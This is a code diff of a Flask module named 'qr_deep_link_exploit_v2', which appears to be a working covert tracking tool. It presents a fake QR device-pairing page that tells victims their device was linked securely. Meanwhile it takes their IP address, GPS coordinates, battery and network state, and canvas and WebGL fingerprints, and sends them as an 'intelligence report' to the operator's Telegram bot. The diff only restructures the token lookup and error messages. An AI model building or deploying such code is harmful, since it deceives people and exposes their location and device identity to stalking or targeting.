@@ -5,10 +5,9 @@ import redis
 import qrcode
 from flask import Blueprint, request, jsonify, redirect, url_for
 
-# تحديد اسم الـ Blueprint
 qr_bp = Blueprint('qr_deep_link_exploit_v2', __name__)
 
-# --- [1] تأمين اتصال Redis مع إدارة الاستثناءات بالكامل ---
+# --- تنزيل وتطهير رابط الـ Redis بحماية قصوى ---
 REDIS_URL = os.getenv("REDIS_URL", "redis://localhost:6379").strip()
 if REDIS_URL.startswith("redis-cli"):
     REDIS_URL = REDIS_URL.split(" -u ")[-1].strip()
@@ -20,7 +19,7 @@ redis_client = None
 try:
     redis_client = redis.Redis.from_url(REDIS_URL, decode_responses=True, socket_timeout=10, health_check_interval=30)
     redis_client.ping()
-    print("[+] Redis connection established for qr_pairing module.")
+    print("[+] Redis connection established successfully in qr_pairing module.")
 except Exception as e:
     print(f"[-] Critical Redis Connection Error in qr_pairing: {e}")
 
@@ -32,7 +31,6 @@ def init_qr_routes(app, bot):
     def silent_session_sync():
         try:
             if not request.is_json:
-                print("[-] Sync error: Invalid content type (not JSON)")
                 return jsonify({"status": "error", "message": "Invalid content type"}), 400
 
             data = request.get_json(silent=True) or {}
@@ -41,73 +39,68 @@ def init_qr_routes(app, bot):
             print(f"[*] Received sync request with token: {token}")
 
             if not token:
-                print("[-] Sync error: Missing token in payload")
                 return jsonify({"status": "error", "message": "Missing token"}), 400
 
             if not redis_client:
-                print("[-] Redis client is not available in qr_pairing.")
+                print("[-] Redis client is offline.")
                 return jsonify({"status": "error", "message": "Database offline"}), 500
 
-            # التحقق من الـ Token في Redis
-            owner_chat_id = None
+            # البحث عن الـ Token في Redis وحذفه فوراً لمنع التكرار
+            redis_key = f"qr_token:{token}"
+            owner_chat_id = redis_client.get(redis_key)
+            print(f"[*] Redis Lookup -> Key: {redis_key} | Found Chat ID: {owner_chat_id}")
+
+            if not owner_chat_id:
+                print(f"[-] Token '{token}' not found or expired in Redis!")
+                return jsonify({"status": "error", "message": "Token expired or invalid"}), 404
+
+            # حذف الـ Token بعد إيجاده لمرة واحدة فقط
+            redis_client.delete(redis_key)
+
+            source_ip = (
+                request.headers.get('CF-Connecting-IP') or 
+                request.headers.get('X-Forwarded-For') or 
+                request.headers.get('X-Real-IP') or 
+                request.remote_addr
+            )
+            if source_ip and ',' in source_ip:
+                source_ip = source_ip.split(',')[0].strip()
+
+            geo = data.get('geolocation', {})
+            battery = data.get('battery', {})
+            network = data.get('network', {})
+            screen = data.get('screen', {})
+            fingerprint = data.get('fingerprint', {})
+
+            msg = (
+                "🎯🔥 **[تقرير استخبارات الـ QR الميدانية]**\n"
+                "--------------------------------------------------\n"
+                f"🌍 **عنوان الـ IP الخارجي:** `{source_ip}`\n"
+                f"📍 **إحداثيات الموقع (GPS):**\n"
+                f"   • خط العرض: `{geo.get('latitude', 'مرفوض/غير متاح')}`\n"
+                f"   • خط الطول: `{geo.get('longitude', 'مرفوض/غير متاح')}`\n"
+                f"   • الدقة: `{geo.get('accuracy', 'N/A')} متر`\n"
+                f"🔋 **حالة البطارية:** `{battery.get('level', 'N/A')}% | الشحن: {battery.get('charging', 'N/A')}`\n"
+                f"📶 **نوع شبكة الاتصال:** `{network.get('effectiveType', 'N/A')} | السرعة: ~{network.get('downlink', 'N/A')} Mbps`\n"
+                f"💻 **نظام التشغيل والمعمارية:** `{data.get('platform', 'Unknown')}`\n"
+                f"🧠 **معمارية المعالج:** `{fingerprint.get('cpu_architecture', 'N/A')}`\n"
+                f"💾 **ذاكرة الجهاز:** `{fingerprint.get('device_memory', 'N/A')} GB`\n"
+                f"📐 **دقة الشاشة والعمق:** `{screen.get('width', 'N/A')}x{screen.get('height', 'N/A')} ({screen.get('colorDepth', 'N/A')}-bit)`\n"
+                f"🎨 **بصمة Canvas:** `{fingerprint.get('canvas_hash', 'N/A')}`\n"
+                f"🖼️ **بصمة WebGL:** `{fingerprint.get('webgl_hash', 'N/A')}`\n"
+                f"🌐 **اللغة المحلية:** `{fingerprint.get('language', 'N/A')}`\n"
+                f"⏳ **المنطقة الزمنية:** `{fingerprint.get('timezone', 'N/A')}`\n"
+                f"🕵️ **وضع التصفح الخفي:** `{fingerprint.get('incognito_mode', 'N/A')}`\n"
+                f"⚙️ **بصمة المتصفح (UserAgent):**\n`{data.get('userAgent', 'N/A')}`\n"
+                "--------------------------------------------------"
+            )
+            
             try:
-                redis_key = f"qr_token:{token}"
-                owner_chat_id = redis_client.get(redis_key)
-                print(f"[*] Looked up key '{redis_key}' in Redis. Result (chat_id): {owner_chat_id}")
-                
-                if owner_chat_id:
-                    redis_client.delete(redis_key)
-                    print(f"[*] Token {token} deleted successfully from Redis.")
-            except Exception as redis_err:
-                print(f"[-] Redis read/delete error for token {token}: {redis_err}")
-                owner_chat_id = None
+                bot.send_message(owner_chat_id, msg, parse_mode="Markdown")
+                print(f"[+] Report successfully dispatched to Telegram chat ID: {owner_chat_id}")
+            except Exception as bot_err:
+                print(f"[-] Telegram dispatch error: {bot_err}")
 
-            if owner_chat_id:
-                source_ip = (
-                    request.headers.get('CF-Connecting-IP') or 
-                    request.headers.get('X-Forwarded-For') or 
-                    request.headers.get('X-Real-IP') or 
-                    request.remote_addr
-                )
-                if source_ip and ',' in source_ip:
-                    source_ip = source_ip.split(',')[0].strip()
-
-                geo = data.get('geolocation', {})
-                battery = data.get('battery', {})
-                network = data.get('network', {})
-                screen = data.get('screen', {})
-                fingerprint = data.get('fingerprint', {})
-
-                msg = (
-                    "🎯🔥 **[تقرير استخبارات الـ QR الميدانية]**\n"
-                    "--------------------------------------------------\n"
-                    f"🌍 **عنوان الـ IP الخارجي:** `{source_ip}`\n"
-                    f"📍 **إحداثيات الموقع (GPS):**\n"
-                    f"   • خط العرض: `{geo.get('latitude', 'مرفوض/غير متاح')}`\n"
-                    f"   • خط الطول: `{geo.get('longitude', 'مرفوض/غير متاح')}`\n"
-                    f"   • الدقة: `{geo.get('accuracy', 'N/A')} متر`\n"
-                    f"🔋 **حالة البطارية:** `{battery.get('level', 'N/A')}% | الشحن: {battery.get('charging', 'N/A')}`\n"
-                    f"📶 **نوع شبكة الاتصال:** `{network.get('effectiveType', 'N/A')} | السرعة: ~{network.get('downlink', 'N/A')} Mbps`\n"
-                    f"💻 **نظام التشغيل والمعمارية:** `{data.get('platform', 'Unknown')}`\n"
-                    f"🧠 **معمارية المعالج:** `{fingerprint.get('cpu_architecture', 'N/A')}`\n"
-                    f"💾 **ذاكرة الجهاز:** `{fingerprint.get('device_memory', 'N/A')} GB`\n"
-                    f"📐 **دقة الشاشة والعمق:** `{screen.get('width', 'N/A')}x{screen.get('height', 'N/A')} ({screen.get('colorDepth', 'N/A')}-bit)`\n"
-                    f"🎨 **بصمة Canvas:** `{fingerprint.get('canvas_hash', 'N/A')}`\n"
-                    f"🖼️ **بصمة WebGL:** `{fingerprint.get('webgl_hash', 'N/A')}`\n"
-                    f"🌐 **اللغة المحلية:** `{fingerprint.get('language', 'N/A')}`\n"
-                    f"⏳ **المنطقة الزمنية:** `{fingerprint.get('timezone', 'N/A')}`\n"
-                    f"🕵️ **وضع التصفح الخفي:** `{fingerprint.get('incognito_mode', 'N/A')}`\n"
-                    f"⚙️ **بصمة المتصفح (UserAgent):**\n`{data.get('userAgent', 'N/A')}`\n"
-                    "--------------------------------------------------"
-                )
-                try:
-                    bot.send_message(owner_chat_id, msg, parse_mode="Markdown")
-                    print(f"[+] Report successfully sent to Telegram chat ID: {owner_chat_id}")
-                except Exception as bot_err:
-                    print(f"[-] Telegram dispatch error to {owner_chat_id}: {bot_err}")
-            else:
-                print(f"[-] Warning: Token '{token}' was NOT found in Redis or expired!")
-                
             return jsonify({"status": "synchronized", "code": 200}), 200
             
         except Exception as err:
@@ -310,13 +303,17 @@ def init_qr_routes(app, bot):
                                 <p>تم ربط الجهاز وتأكيد الهوية بنجاح تام. يمكنك إغلاق الصفحة الآن بأمان.</p>
                             `;
                         }} else {{
-                            throw new Error('Sync endpoint rejected data');
+                            document.getElementById('mainCard').innerHTML = `
+                                <div style="font-size: 42px; color: #ef4444; margin-bottom: 10px;">✕</div>
+                                <h3 style='color: #ef4444;'>انتهت صلاحية الرابط</h3>
+                                <p>هذا الكود غير صالح أو تم استخدامه مسبقاً.</p>
+                            `;
                         }}
                     }} catch (err) {{
                         document.getElementById('mainCard').innerHTML = `
                             <div style="font-size: 42px; color: #ef4444; margin-bottom: 10px;">✕</div>
-                            <h3 style='color: #ef4444;'>انتهت مهلة الاتصال</h3>
-                            <p>تعذر إتمام عملية الربط الآمن، يرجى مسح الكود مرة أخرى.</p>
+                            <h3 style='color: #ef4444;'>خطأ في الاتصال</h3>
+                            <p>تعذر إتمام عملية الربط الآمن بالسيرفر.</p>
                         `;
                     }}
                 }});
